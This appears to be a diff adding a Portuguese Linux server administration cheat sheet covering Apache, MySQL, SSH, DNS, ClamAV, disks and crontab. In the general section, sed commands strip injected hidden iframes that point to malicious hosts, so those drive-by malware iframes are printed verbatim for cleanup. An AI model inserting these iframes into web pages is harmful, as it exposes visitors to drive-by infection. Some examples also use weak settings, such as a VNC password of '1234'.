@@ -1,0 +1,1750 @@
+-------------------------------------------------------------------
+---------------------- Geral --------------------------------------
+-------------------------------------------------------------------
+
+
+
+
+# Listar os servicos activos + a porta
+netsatat -pant
+
+
+# get the name of the command / executable listening on some port
+lsof -i
+
+
+# Iniciar e parar serviços
+/etc/init.d/apache2 -k start
+/etc/init.d/apache2 -k stop
+
+
+# Indicar e remover inicialização do serviço no boot do sistema
+update-rc.d -f apache2 remove 
+update rc.d -f apache2 defaults
+
+
+# Criar directório
+mkdir /usr/local/php5
+
+
+# Eliminar ficheiro
+rm moneficheiro.tar.gz
+
+
+# Eliminar directório
+rm -r htdocs
+
+
+#eliminar diretório com subdiretórios
+rm -R htdocs
+
+
+# Instalar através de ficheiro compactado
+$> cp phpMyAdmin-2.7.0-pl2.tar.gz /usr/local/php5/
+$> cd /usr/local/php5/
+$> tar -zxvf phpMyAdmin-2.7.0-pl2.tar.gz
+$> rm phpMyAdmin-2.7.0-pl2.tar.gz
+
+
+# Instalar php5 no apache 2
+--> é necessário copiar os ficheiros: /etc/apache2/mods-available/php5.conf e php5.load
+   para /etc/apache2/mods-enabled/
+
+
+# remover Postgresql
+aptitude remove postgresql postgresql-client 
+
+
+
+
+# reiniciar o servidor
+shutdown -r now
+
+
+# Alterar password de utilizador
+passwd username
+
+
+# Mudar para o super utilizadro (root)
+su –
+
+
+# Gravar ficheiro com o vi sem permissões
+:w !sudo tee %
+
+
+
+
+# Ler ficheiro de texto
+cat ficheiro.txt
+pg ficheiro.txt (paginado)
+less ficheiro.txt (para poder descer e subir no texto)
+
+
+# Procurar ficheiro
+find / -name 'php.ini'
+my.cnf
+
+
+# Mover ficheiro
+mv home/miguel/temp/teste.tar.gz var/www/virtual
+
+
+#alterar o nome de um ficheio
+mv configuration.php configuration_alt.php
+
+
+# Ver versão do Kernel
+uname –r (resumido)
+uname –a (completo)
+
+
+#Ver versão de distrubuição Linux instalado
+cat /etc/*release
+
+
+# Obter charset e codepage do kernel
+grep -i charset boot/config-2.6.18-3-686 (o nome do ficheiro config depende da versão
+					  do kernel)
+grep -i codepage boot/config-2.6.18-3-686 (o nome do ficheiro config depende da versão
+					  do kernel)
+
+
+# Definição da língua definida para o sistema
+ficheiro etc/environment
+dpkg-reconfigure locales 
+
+
+# Obter e alterar as codificações da língua
+locale
+ 
+
+
+# Compactar ficheiros ou directórios
+tar -cf educatic.tar /var/www/web1/web
+gzip educatic.tar 
+ou
+tar -cvzf educatic.tar.gzip /var/www/web1/web
+
+
+
+
+# Descompactar ficheiro zip 
+unzip dokeos-1.8.2.zip (compactados em zip)
+7z x dokeos-1.8.2.rar (para outros tipos de compactação)
+
+
+# Descompactar ficheiro 7z
+p7zip -d web.7z (Caso a aplicação não esteja instalada: apt-get install p7zip)
+
+
+# Descompactar ficheiros gz
+tar –xzvf archive.tar.gz
+
+
+
+
+# Copiar um ficheiro para um directório
+cp file.txt etc/httpd
+
+
+# Copiar sub directorias e ficheiros 
+cp -R dokeos-red5APP-1.8/* /usr/lib/red5/webapps
+
+
+#criar uma ligação para um diretório
+ln –s /folder/to/link /where/to/linkitcd
+
+
+# Visualizar processos a correr
+ps –auxww ou ps -aux 
+
+
+# Matar processo
+kill -9 PIDNUMBER
+
+
+#Verificar estado de utilização dos discos
+df -hdocker
+
+
+#Procurar texto em directório e sub directórios
+grep -r "Tudo sobre o Google" /var/www/virtual/educatic.info
+ver url: http://www.cyberciti.biz/faq/howto-search-find-file-for-text-string/
+
+
+#Procurar por  'foo'
+find / -name foo
+
+
+#Obter path localização de ficheiro/aplicação
+which psql
+
+
+#Iniciar Gnome
+startx
+
+
+#Verificar a data do servidor
+date
+
+
+#Verificar o tempo que demora um comando
+time sleep 60
+
+
+#Alterar a data do servidir
+date -s "15 OCT 2008 15:24:00"
+
+
+#Definir timezone do sistema
+dpkg-reconfigure tzdata (escolher Lisboa pois Madeira por vezes dá problemas)
+
+
+#Verificar qual o hosname do servidor
+hostname (nome servidor)
+hostname -f (nome servidor + domínio)
+
+
+#Alterar o hostname e domainname do servidor
+É necessário alterar o ficheiro:
+/etc/hostname e colocar o hostname
+
+
+Depois alterar o ficheiro /etc/hosts e colocar
+o hostname e o domain name
+
+
+
+
+#Verificar ou alterar as fontes de instalação do servidor
+/etc/apt/sources.list
+
+
+#Alterar as permissões de um determinado directório
+chmod * -R 0770 moodledata (para um directório interiro)
+chmod 444 configuration.php (para um ficheiro)
+ou
+chmod g+rwx configuration.php (u:user, g:group, a:all)
+
+
+# Obter o tamnho completo de um directório
+du -ch (todos os subdirectórios + total)
+du -h | grep -v '/' | awk '{print $1}' (apenas o total)
+
+
+# Procurar e substituir caracteres num ficheiro
+sed -i 's/find_string/replace_string/g' file.html
+
+
+
+
+sed -i 's/<iframe src="http:\/\/u8t.ru:8080\/index.php" width=143 height=118 style="visibility: hidden"><\/iframe>//g' index_old.html
+
+
+# Procurar e substituir caracteres de todos os ficheiros dentro do directório e subdirectórios actuais
+find -type f -exec sed -i 's/<iframe src="http:\/\/u8t.ru:8080\/index.php" width=143 height=118 style="visibility: hidden"><\/iframe>//g' {} \;
+
+
+find -type f -exec sed -i 's/<iframe src="http:\/\/u1x.ru:8080\/index.php" width=168 height=198 style="visibility: hidden"><\/iframe>//g' {} \;
+
+
+find -type f -exec sed -i 's/<iframe src="http:\/\/u0t.ru:8080\/index.php" width=157 height=183 style="visibility: hidden"><\/iframe>//g' {} \;
+
+
+find -type f -exec sed -i 's/<iframe src="http:\/\/a5f.ru:8080\/ts\/in.cgi?pepsi93" width=125 height=125 style="visibility: hidden"><\/iframe>//g' {} \;
+
+
+find -type f -exec sed -i 's/<iframe src="http:\/\/u8r.ru:8080\/index.php" width=125 height=108 style="visibility: hidden"><\/iframe>//g' {} \;
+
+
+find -type f -exec sed -i 's/<iframe src="http:\/\/c3q.ru:8080\/index.php" width=131 height=110 style="visibility: hidden"><\/iframe>//g' {} \;
+
+
+find -type f -exec sed -i 's/<iframe src="http:\/\/u7z.ru:8080\/index.php" width=116 height=128 style="visibility: hidden"><\/iframe>//g' {} \;
+
+
+find -type f -exec sed -i 's/<iframe src="http:\/\/a3j.ru:8080\/ts\/in.cgi?pepsi84" width=125 height=125 style="visibility: hidden"><\/iframe>//g' {} \;
+
+
+find -type f -exec sed -i 's/<iframe src="http:\/\/u3m.ru:8080\/index.php" width=187 height=196 style="visibility: hidden"><\/iframe>//g' {} \;
+
+
+find -type f -exec sed -i 's/<iframe src="http:\/\/u7o.ru:8080\/index.php" width=124 height=197 style="visibility: hidden"><\/iframe>//g' {} \;
+
+
+find -type f -exec sed -i 's/<iframe src="http:\/\/u9j.ru:8080\/index.php" width=200 height=124 style="visibility: hidden"><\/iframe>//g' {} \;
+
+
+find -type f -exec sed -i 's/<iframe src="http:\/\/u9a.ru:8080\/index.php" width=188 height=189 style="visibility: hidden"><\/iframe>//g' {} \;
+
+
+find -type f -exec sed -i 's/<iframe src="http:\/\/u0c.ru:8080\/index.php" width=104 height=181 style="visibility: hidden"><\/iframe>//g' {} \;
+
+
+find -type f -exec sed -i 's/<iframe src="http:\/\/a3t.ru:8080\/ts\/in.cgi?pepsi91" width=125 height=125 style="visibility: hidden"><\/iframe>//g' {} \;
+
+
+find -type f -exec sed -i 's/<iframe src="http:\/\/efradin.com\/?click=1BE839" width=1 height=1 style="visibility:hidden;position:absolute"><\/iframe>//g' {} \;
+
+
+# Criar ficheiro vazio
+touch /home/tclark/touch1.fil 
+touch touch2.fil 
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+-------------------------------------------------------------------
+---------------------- Rede ---------------------------------------
+-------------------------------------------------------------------
+
+
+# obter dados da rede
+ifconfig
+ifconfig eth0
+
+
+# Definir IP fixo (network, broadcast and gateway are optional)
+# Editar o ficheiro /etc/network/interfaces com o seguinte texto:
+auto eth0
+iface eth0 inet static
+    address 172.16.236.90
+    netmask 255.255.0.0
+    network 172.16.0.0
+    broadcast 172.16.236.255
+    gateway 172.16.0.1 
+
+
+# Definir IP automático a partir do dhcp 
+# Editar o ficheiro /etc/network/interfaces com o seguinte texto:
+auto eth0
+iface eth0 inet dhcp
+
+
+# Parar e iniciar interface de rede
+ifdown eth0
+ifup eth0
+
+
+# Obter a lista de todos os serviços de rede a correr na máquina
+netstat -tlnp
+
+
+# Verificar se existe um serviço a correr numa determinada porta
+netstat -na |grep 2002
+
+
+# Obter o PID dos processos a correr numa determinada porta
+fuser -vau 22/tcp 22/udp
+
+
+# Obter o IP externo da máquina
+curl ifconfig.me
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+-------------------------------------------------------------------
+---------------------- Firewall Bastille --------------------------
+-------------------------------------------------------------------
+
+
+# Ficheiro de configuração da firewall
+vi etc/Bastille/bastille-firewall.cfg
+
+
+# Reiniciar a firewall
+/etc/init.d/bastille-firewall restart
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+-------------------------------------------------------------------
+---------------------- Apache2 --------------------------------------
+
+
+#instalar
+apt-get install apache2-mpm-prefork libapache2-mod-php5 apache2.2-common
+
+
+# Directório de sites
+/var/www
+
+
+# Parar e iniciar servidor
+apache2 -k stop
+apache2 -k start
+ou /etc/init.d/apache2 start/stop
+
+
+
+
+# Forcar o parar do apache
+killall -9 apache2
+
+
+# Quando der o seguinte erro: 
+# (98)Address already in use: make_sock: could not bind to address 0.0.0.0:80
+# resolver da seguinte maneira:
+1- verificar quais os processos a correr na porta 80 através do 
+   comando lsof -i tcp:80
+2- Matar todos os processos a correr nesta porta através do comando
+   kill -9 PIDNUMBER
+3- Iniciar o apache: apache2 -k start
+
+
+# Definir charset para o apache
+ - No ficheiro /etc/apache2/apache2.conf decomentar a seguinte frase:
+	AddDefaultCharset ISO-8859-1
+
+
+# Definir o upload de ficheiros
+See into /etc/apache2/apache2.conf or /etc/apache2/sites-available/* 
+if "php_admin_value upload_max_filesize" exists and change the value
+
+
+
+
+# Definir limites de clientes e de ligações
+# alterar o ficheiro /etc/apache2/apache2.conf e editar~
+# os seguintes parâmetros:
+MaxKeepAliveRequests 1000
+Serverlimit 1500
+
+
+<IfModule mpm_prefork_module>
+    StartServers          50
+    MinSpareServers       50
+    MaxSpareServers      100
+    MaxClients          1500
+    MaxRequestsPerChild   0
+</IfModule>
+
+
+<IfModule mpm_worker_module>
+    StartServers          20
+    MaxClients          1500
+    MinSpareThreads      250
+    MaxSpareThreads      750
+    ThreadsPerChild      250
+    MaxRequestsPerChild   0
+</IfModule>
+
+
+# Definir o timezone para os sites.
+# Editar o ficheiro /etc/php5/apache2/php.ini
+# descomentar a linha ";date.timezone =" e colocar:
+date.timezone =Europe/Lisbon
+
+
+#Verificar a sintaxe do apache
+apache2ctl -S
+
+
+#Ficheiros de log do apache2
+/var/log/apache2
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+-------------------------------------------------------------------
+---------------------- Apache httpd -------------------------------
+-------------------------------------------------------------------
+
+
+
+
+# Parar e iniciar servidor
+apachectl start
+apachectl stop
+apachectl restart
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+-------------------------------------------------------------------
+---------------------- MySQL --------------------------------------
+-------------------------------------------------------------------
+
+
+# Instalar MySQL
+apt-get install php5-mysql mysql-server-core-5.5 mysql-server-5.5
+
+
+# Upload de ficheiro de bk
+mysql -u root -p
+use educatic
+source /var/lib/mysql/data/educatic.sql 
+
+
+# Backup de base de dados 
+mysqldump -u root -p 'Teste' > /bk_temp/Teste.sql
+
+
+# Backup de todas as bases de dados
+mysqldump -u root -p --all-databases > all_databases.sql
+
+
+#Iniciar, parar e reiniciar o mysql
+/etc/init.d/mysql restart
+/etc/init.d/mysql stop
+/etc/init.d/mysql start
+Ou
+service mysql start|restart|stop|status 
+
+
+#Matar o processo do mysql
+pkill mysqld
+
+
+# Se der erro ao fazer bk de muitas bases de dados e o erro indicar
+# que não encontra ou que não consegue fazer lock a uma determinada
+# tabela significa que é necessário aumentar o limite de ficheiros 
+# abertos pelo mysql. É necessário colocar no ficheiro \etc\mysql\my.cnf 
+# a seguinte frase (colocar depois de [mysqlld_safe]): 
+open-files-limit=8192
+
+
+# Se der o erro: mysqldump: Can’t get CREATE TABLE for table `Tory_Map` (Can’t open file: ‘Tory_Map.MYI’. (errno: 145)) fazer o seguinte:
+
+
+1) Do a check table as below.
+mysql> check table Tory_Map;
++——————+——-+———-+——————————-+
+| Table            | Op    | Msg_type | Msg_text                      |
++——————+——-+———-+——————————-+
+| doc.Tory_Map | check | warning  | Table is marked as crashed    |
+| doc.Tory_Map | check | error    | Found 3670180 keys of 3670179 |
+| doc.Tory_Map | check | error    | Corrupt                       |
++——————+——-+———-+——————————-+
+3 rows in set (20 min 1.65 sec)
+3) If the table is marked as crashed then do a repair of that table as below.
+mysql> repair table Tory_Map;
++——————+——–+———-+———-+
+| Table            | Op     | Msg_type | Msg_text |
++——————+——–+———-+———-+
+| doc.Tory_Map | repair | status   | OK       |
++——————+——–+———-+———-+
+1 row in set (1 min 42.77 sec)
+and if you do a check table now, the result has to be ok as below.
+mysql> check table Tory_Map;
++——————+——-+———-+———-+
+| Table            | Op    | Msg_type | Msg_text |
++——————+——-+———-+———-+
+| doc.Tory_Map | check | status   | OK       |
++——————+——-+———-+———-+
+1 row in set (6 min 3.33 sec)
+
+
+
+
+# Obter os processos do mysql
+ps aux | grep mysql
+
+
+# definir acesso remoto
+Editar o ficheiro /etc/mysql/my.cnf e realizar as seguintes alterações:
+	--> procurar pela tag [mysqld]
+	--> seguida a esta tag procurar pela variável skip-networking e comentá-la 
+		(# skip-networking)
+	--> procurar pela variável bind-address e igualá-la ao ip da máquina
+		(bind-address = 192.168.1.134)  ou a 0.0.0.0
+	--> reiniciar o mysql
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+
+
+-------------------------------------------------------------------
+---------------------- ssh ----------------------------------------
+-------------------------------------------------------------------
+
+
+# instalar ssh
+apt-get install ssh (necessita do cd de instalação do Debian)
+
+
+# Ficheiro de configuração do ssh
+/etc/ssh/sshd_config
+
+
+# Tornar o ssh seguro
+--> Alterar a porta no ficheiro de configuração (ex: Port 27)
+--> No sshd_config não permitir logi do user (PermitRootLogin no)
+--> Indicar apenas um user, e/ou máquina, a poder usar o ssh 
+    (AllowUsers miguel ou AllowUsers miguel@192.168.1.111)
+
+
+# Reiniciar o servico de ssh 
+sudo /etc/init.d/ssh restart
+
+
+# log de acesso ao ssh
+grep -ir ssh /var/log/*
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+-------------------------------------------------------------------
+---------------------- VHCS ---------------------------------------
+-------------------------------------------------------------------
+
+
+# instalar VHCS
+--> Adicionar a  /etc/apt/sources.list: deb http://apt.scunc.it/ sarge main 
+					e/ou deb http://apt.scunc.it/ etch main	(caso dê erro)
+--> apt-get update
+--> apt-get install mysql-server mysql-client
+--> mysqladmin -u root password <NEWPASSWORD>
+--> apt-get install vhcs*
+-->Quando der o erro:
+ 	If specified by -literal_key, then the key length must be equal to the chosen cipher's key length of 56 bytes at /var/www/vhcs2/engine//vhcs2_common_code.pl
+	Realizar a seguinte substituição no ficheiro indicado no erro:
+		Antes:
+			   my $cipher = Crypt::CBC -> new(                                     
+						{                                        
+							'key'             => $main::db_pass_key,                                        
+							'cipher'          => 'Blowfish',                                        
+							'iv'              => $main::db_pass_iv,                                        
+							'regenerate_key'  => 0,                                        
+							'padding'         => 'space',                                        
+							'prepend_iv'      => 0                                    
+						}                                  
+					);
+
+
+		Depois:
+			   my $cipher = Crypt::CBC -> new(                                     
+						{     
+							
+							'keysize'         => 32,                                   
+							'key'             => $main::db_pass_key,                                        
+							'cipher'          => 'Blowfish',                                        
+							'iv'              => $main::db_pass_iv,                                        
+							'regenerate_key'  => 0,                                        
+							'padding'         => 'space',                                        
+							'prepend_iv'      => 0                                    
+						}                                  
+					);
+
+
+OBS: Geralmente é necessário alterar nos seguintes ficheiros:
+	/var/www/vhcs2/engine//vhcs2_common_code.pl
+	/var/lib/dpkg/info/vhcs.postinst
+     Atenção que num dos ficheiros é necessário alterar em dois sítios.
+		
+
+
+--> Se der erro de acesso à base de dados do utilizador
+    debian-sys-maint dar todas as permissões ao utilizador
+    ou então atribuir a password que se encontra definida
+    no ficheiro  /etc/mysql/debian.cnf
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+-------------------------------------------------------------------
+---------------------- ISPConfig ----------------------------------
+-------------------------------------------------------------------
+
+
+# Reiniciar o ISPConfig
+/etc/init.d/ispconfig_server start|stop|restart
+
+
+# Obter a versão do ISPConfig
+Aceder à base de dados e visualizar o registo na tabela 'sys_config' 
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+
+
+
+
+-------------------------------------------------------------------
+---------------------- php ----------------------------------------
+-------------------------------------------------------------------
+
+
+
+
+# Aumentar a memória de trabalho
+--> Alterar no ficheiro /etc/php4/apache2/php.ini 
+    o parâmetro  memory_limit = 8M para memory_limit = 16M
+
+
+# Indicar como charset por omissão o iso-8859-1 para permitir
+# mostrar acentuação no browser
+--> Alterar no ficheiro /etc/php5/apache2/php.ini
+    o parâmetro  default_charset para default_charset = "iso-8859-1"
+
+
+# Para definir o tamanho dos ficheiros a fazer upload. Alterar no ficheiro /etc/php5/apache2/php.ini
+ e/ou no ficheiro /etc/php5/cgi/php.ini caso exista:
+(php.ini) upload_max_filesize = 50M (or whatever you want, M = Megabyte) 
+(php.ini)  (script time limit including file upload time, value is in seconds) 
+(php.ini) max_input_time (script time limit for file upload time, value is in seconds) 
+(php.ini ?) post_max_size 
+(php.conf) LimitRequestBody with default value 524288 (in bytes, so this is only 512 Kilobyte!) 
+
+
+# Obter localização dos ficheiros de configuração para o php no sistema
+php --ini
+
+
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+-------------------------------------------------------------------
+---------------------- Java ---------------------------------------
+-------------------------------------------------------------------
+
+
+# Verificar a versão java
+--> java -version
+
+
+# Instalar versão 1.5 JDK
+--> sudo apt-get install sun-java5-jdk
+
+
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+
+
+-------------------------------------------------------------------
+---------------------- DNS ---------------------------------------
+
+
+# Definir servidores de DNS:
+Criar o ficheiro tail:
+sudo vim /etc/resolvconf/resolv.conf.d/tail
+
+
+Escrevre no ficheiro os servidores DNS assim:
+
+
+nameserver 208.67.222.222
+nameserver 208.67.220.220
+nameserver 202.51.5.52
+
+
+Reiniciar o servidor DNS:
+    sudo /etc/init.d/resolvconf restart
+
+
+# Abrir porta no router para obter servidor DNS interno
+--> editar o ficheiro /etc/bind/named.conf.options e descomentar
+    a linha query-source address * port 53/
+
+
+# Verificar servidor DNS
+--> nslookup www.google.com
+
+
+# Alterar IP associado a DNS.
+--> Por exemplo. para o site educatic.debiantest.com é preciso pimeiro verificar qual o ficheiro de bind no ficheiro
+    /etc/bind/vhcs.conf
+--> Para o site educatic.debiantest.com é o ficheiro /var/cache/bind/educatic.debiantest.com.db. Neste ficheiro é 
+    necessário alterar o IP para o que interessa. Este ficheiro parece ser alterado quando dse configura o VHCS
+
+
+
+
+# Reiniciar servidor de DNS
+--> /etc/init.d/bind9 restart
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+-------------------------------------------------------------------
+---------------------- apt-get ------------------------------------
+-------------------------------------------------------------------
+
+
+# Ficheiro onde se encontram definidos os repositórios
+/etc/apt/sources.list
+
+
+#Obter pacotes de aplicações actualizados
+apt-get update
+
+
+#Actualizar o sistema
+apt-get upgrade
+
+
+# instalar e remover aplicações
+apt-get install apache2
+apt-get remove apache2
+
+
+# remover aplicação
+apt-get --purge remove VHCS*
+
+
+#verificar se aplicação está instalada e se existe nos repositórios
+apt-cache policy docker-engine
+
+
+# verificar a versão de um pacote instalado
+apt-cache show [nome_do_pacote]
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+-------------------------------------------------------------------
+---------------------- unrar ------------------------------------
+-------------------------------------------------------------------
+
+
+# Instalar unrar
+apt-get install unrar
+
+
+# Descompactar ficheiro rar
+unrar x [nome ficheiro]
+
+
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+
+
+-------------------------------------------------------------------
+---------------------- utilizadores ------------------------------------
+-------------------------------------------------------------------
+
+
+# Adicionar utilizador
+adduser miguel
+
+
+# Remover utilizador
+userdel -r miguel
+
+
+# Listar utilizadores de um grupo
+groups Miguel
+
+
+#adicionar utilizador a grupo
+usermod -a -G www-data miguelbgouveia
+
+
+# Verificar quais os utilizadores ligados
+users
+
+
+# Alterar o utilizador owner dos ficheiros e directórios
+# (incluí os sub ficheiros e sub directórios)
+chown vu2021:www-data * -R
+
+
+# Alterar password de utilizador
+passwd [nome_utilizador]
+
+
+# Matar processos de um utilizador
+ 1- Obter os processos do utilizador: #ps -aux | grep [nome_utilizador]
+ 2- Matar os processos através do comando Kill -9 [PID]
+
+
+# Verificar permissoes utilizadores
+ficheiro etc/passwd
+
+
+# trabalhar como super administrador
+sudo -i
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+-------------------------------------------------------------------
+---------------------- Downloads -------------------------------
+-------------------------------------------------------------------
+
+
+#Obter ficheiro da internet
+wget http://dl.fancycode.com/red5/debian/0.6.2/red5_0.6.2-1_all.deb
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+-------------------------------------------------------------------
+---------------------- Instalar aplicações ------------------------
+-------------------------------------------------------------------
+
+
+# instalar através de ficheiros .deb
+dpkg -i red5_0.6.2-1_all.deb
+
+
+# Para obter estado de pacotes instalados
+dpkg-query -s vsftpd
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+-------------------------------------------------------------------
+---------------------- Definição servidor de mail -----------------
+-------------------------------------------------------------------
+
+
+# Definir o nome da conta de mail
+Alterar o ficheiro /etc/mailname e colocar o nome da conta de 
+mail a utilizar. Exemplo: educatic.info
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+-------------------------------------------------------------------
+---------------------- vsftpd -------------------------------------
+-------------------------------------------------------------------
+
+
+# Iniciar e parar o servidor FTP
+/etc/init.d/vsftpd {start|stop|restart|reload}
+
+
+# Se der o erro que só permite acesso de utilizadores anónimos
+# é necessário editar o ficheiro /etc/vsftpd.conf e indicar as 
+# seguintes configurações:
+anonymous_enable=NO
+local_enable=YES
+
+
+#Ficheiro de log
+/var/log/proftpd/proftpd.log
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+-------------------------------------------------------------------
+---------------------- VNC ----------------------------------------
+-------------------------------------------------------------------
+# Instalar servidor de VNC
+apt-get install x11vnc
+
+
+# Definir password (no command line ao iniciar o serviço)
+x11vnc -passwd '1234'
+
+
+
+
+-------------------------------------------------------------------
+---------------------- Hardware -----------------------------------
+-------------------------------------------------------------------
+
+
+#Para obter informação de hardware e BIOS
+
+
+dmidecode --type {Number}
+
+
+# Type Short Description 
+0 BIOS  
+1 System  
+2 Base Board  
+3 Chassis  
+4 Processor  
+5 Memory Controller  
+6 Memory Module  
+7 Cache  
+8 Port Connector  
+9 System Slots  
+10 On Board Devices  
+11 OEM Strings  
+12 System Configuration Options  
+13 BIOS Language  
+14 Group Associations  
+15 System Event Log  
+16 Physical Memory Array  
+17 Memory Device  
+18 32-bit Memory Error  
+19 Memory Array Mapped Address  
+20 Memory Device Mapped Address  
+21 Built-in Pointing Device  
+22 Portable Battery  
+23 System Reset  
+24 Hardware Security  
+25 System Power Controls  
+26 Voltage Probe  
+27 Cooling Device  
+28 Temperature Probe  
+29 Electrical Current Probe  
+30 Out-of-band Remote Access  
+31 Boot Integrity Services  
+32 System Boot  
+33 64-bit Memory Error  
+34 Management Device  
+35 Management Device Component  
+36 Management Device Threshold Data  
+37 Memory Channel  
+38 IPMI Device  
+39 Power Supply  
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+-------------------------------------------------------------------
+---------------------- Antivirus Avast ----------------------------
+-------------------------------------------------------------------
+
+
+--> scan tudo no directório actual
+avast -a -c -t=A -p=4
+
+
+--> actualização do antivirus
+avast-update
+
+
+-------------------------------------------------------------------
+------------------------------------------------------------------
+
+
+
+
+-------------------------------------------------------------------
+---------------------- Antivirus clamav ----------------------------
+-------------------------------------------------------------------
+
+
+--> Verificar a versão do clamav
+clamscan --version
+
+
+--> Desinstalar o clamav
+apt-get --purge remove clamav*
+
+
+
+
+--> Instalar nova versão
+Obter a versão mais recente
+	http://www.clamav.net/download/sources
+
+
+criar utilizador clamav
+	adduser miguel
+
+
+Descompactar o ficheiro no servidor e posicionar-se no directório 
+criado e intruduzir:
+	./configure
+
+
+
+
+Digitar no mesmo directório:
+	make
+
+
+Digitar no mesmo directório:
+	make install
+
+
+Digitar no mesmo directório:
+	ldconfig
+
+
+Editar os ficheiros /usr/local/etc/freshclam.conf e /usr/local/etc/clamd.conf : 
+	- comentar a linha 
+		Example --> #Example
+	- inserir o seguinte parâmetro logo debaixo da palavra DatabaseDirectory
+		DatabaseDirectory /usr/local/share/clamav
+
+
+Correr o seguinte comando no directório de instalação:
+	freshclam
+
+
+Criar o ficheiro /var/log/clamav/freshclam.log /var/log/freshclam.log e dar permissões
+	mkdir /var/log/clamav
+	touch /var/log/clamav/freshclam.log
+	chmod 600 /var/log/clamav/freshclam.log
+	chown clamav /var/log/clamav/freshclam.log
+
+
+Editar os ficheiros /usr/local/etc/freshclam.conf e /usr/local/etc/clamd.conf para
+indicar o ficheiro de log. Deverá ser indicado no parâmetro UpdateLogFile e/ou LogFile:
+	UpdateLogFile 
+	LogFile /var/log/clamav/freshclam.log 
+		e/ou	 	
+	UpdateLogFile /var/log/clamav/freshclam.log
+
+
+Correr o clamav em daemon mode
+	freshclam -d
+
+
+Adicionar a linha '53 * * * * /usr/local/bin/freshclam --quiet' no contrab para
+que seja actualizado a todas as horas a bd de virus
+	 crontab -e
+
+
+
+
+Adicionar a linha '00 00 * * * clamscan -r' no contrab para
+que seja verificado os virus todos os dia à meia noite
+	 crontab -e
+
+
+--> Verificar a versão do clamav
+cd /usr/local/share/clamav
+clamd -V
+
+
+--> Verificar por virus
+clamscan -r /[path]
+clamscan -r
+clamscan -r -i (mostrar só os infectados)
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+
+
+-------------------------------------------------------------------
+---------------------- Discos -------------------------------------
+-------------------------------------------------------------------
+
+
+#Para obter informação sobre os discos montados no sistema
+fdisk -l
+
+
+#Para ver as partiçoes num determinado disco
+fdisk /dev/sda (depois escolher a opção p)
+
+
+#para manipular as partiçoes dos discos
+--> definir qual o disco a tratar: fdisk /dev/sda
+--> manipular as partições através das seguintes opções:
+	p print the partition table 
+	n create a new partition (na criação da partição podemos indicar o tamanho: +1384M)
+	d delete a partition 
+	a toggle a bootable flag (definir como boottable)
+ 	t change a partition's system id (altrerar o tipo de formatação, é necessário indicar 
+					  o id do tipo)
+	
+--> gravar as alterações ou sair sem gravar:
+	q quit without saving changes 
+	w write the new partition table and exit 
+
+
+
+
+--> Formatar partições
+    mke2fs /dev/sdb1 (formatar em ext2)
+    mkfs.ext3 /dev/sdb1 (formatar em ext3)
+
+
+--> Montar uma partição formatada no sistema de ficheiros
+    mount -t ext2 /dev/sdb1 /disk2
+    mount -t ext3 /dev/sdb1 /disk2
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+
+
+-------------------------------------------------------------------
+---------------------- MyDNS -------------------------------------
+-------------------------------------------------------------------
+
+
+#Iniciar a parar o MyDNS
+/etc/init.d/mydns start/stop
+
+
+#Ficheiro de configuração do mydns
+/etc/mydns.conf
+
+
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+
+
+-------------------------------------------------------------------
+---------------------- Crontab ---------------------------------
+-------------------------------------------------------------------
+
+
+#indica qual o editor de texto a utilizar para o crontab
+export EDITOR=vi 
+
+
+# Edita o ficheiro crontab, se este não existir então é criado.
+
+
+crontab -e 
+
+
+# Mostra o conteudo do ficheiro crontab.
+crontab -l 
+
+
+# Remove o ficheiro crontab.
+crontab -r 
+
+
+#O Crontab tem 5 campos para especificar o dia, data e hora seguido do comando a ser executado
+| | | | |
+| | | | +—– dia da semana  (0 – 6) (Domingo=0)
+| | | +——-  Mes (1 – 12)
+| | +———  Dia do mes  (1 – 31)
+| +———– hora (0 – 23)
++————- minuto (0 – 59)
+
+
+Exemplo:
+Este exemplo remove o conteúdo do directorio /home/lixo todos os dias ás 18:30
+30 18 * * * rm /home/lixo/*
+
+
+Exemplo para correr script em python sempre que o sistema iniciar. O caracter & indica para correr em background:
+@reboot python /root/script.py & 
+
+
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+-------------------------------------------------------------------
+---------------------- Scripts (sh) ----------------------------
+-------------------------------------------------------------------
+
+
+#Dar permissões de execução
+chmod 755 [nome do script] 
+ou
+chmod ugo+x [nome do script]
+
+
+#Executar um script
+bash [nome do script]
+sh [nome do script]
+./ [nome do script]
+. [nome do script]
+
+
+# Início de um script bash
+#!/bin/bash
+# Sript bash Hello World
+#!/bin/bash
+echo ‘Hello World’
+
+
+# Adicionar script ao boot do Sistema
+- Mover para diretório de instalação:
+mv script.sh /etc/init.d
+- Dar permissão de execução
+chmod +x script.sh
+- Adicionar ao processo de iniciação do sistema
+update-rc.d script.sh defaults
+
+
+-------------------------------------------------------------------
+-------------------------------------------------------------------
+
+
+
+
+
+
+
+
+-------------------------------------------------------------------
+---------------------- Docker ----------------------------------
+
+
+
+
+#install
+sudo apt-key adv --keyserver hkp://pgp.mit.edu:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D
+
+
